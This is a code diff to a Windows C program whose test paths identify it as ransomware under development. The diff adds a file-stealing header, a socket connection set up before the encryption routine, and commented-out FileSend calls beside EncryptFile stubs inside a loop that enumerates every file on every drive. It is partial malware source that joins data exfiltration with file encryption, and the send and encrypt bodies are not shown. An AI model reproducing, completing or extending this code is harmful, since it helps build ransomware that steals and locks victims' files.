@@ -3,12 +3,16 @@
 #include <wincrypt.h>
 #include <string.h>
 #include "crypto.h"
+#include "file_steal.h"
 #pragma comment(lib, "advapi32.lib")
 
 char queue[8192][260];
 
 
 int main() {
+    SOCKET socket;
+    struct sockaddr_in socket_addr;
+
     HCRYPTPROV hProv;
     HCRYPTKEY hKey;
     BYTE *keyBlob;
@@ -29,7 +33,10 @@ int main() {
         return 1;
     }
     char* drive = drives;
+    ConnectionEstablish(&socket, &socket_addr);
     InitializeSymmetricCrypto(&hProv, &hKey, &keyBlob);
+
+    // FileSend("C:\\Users\\Admin\\Documents\\ransomware\\test\\passwd.txt", 3213310, socket);
     
     // FileEncrypt("C:\\Users\\Admin\\Documents\\ransomware\\test\\passwd.txt", hProv, hKey);
     // char key[33];
@@ -66,8 +73,9 @@ int main() {
                         tail = (tail + 1) % 8192;
                     } else {
                         sprintf(path, "%s%s", currentParentPath, ffd.cFileName);
-                        // EncryptFile()
                         long long fileSize = ((long long)ffd.nFileSizeHigh << 32 | ffd.nFileSizeLow);
+                        // FileSend()
+                        // EncryptFile()
                         printf("[FILE] %s - %ld bytes\n", path, fileSize);
                     }
                 } while (FindNextFile(hFind, &ffd) != 0);
@@ -79,6 +87,7 @@ int main() {
     }
     
     FinalizeSymmetricCrypto(&hProv, &hKey, &keyBlob);
+    ConnectionClose(&socket);
     getchar();
     return 0;
 }
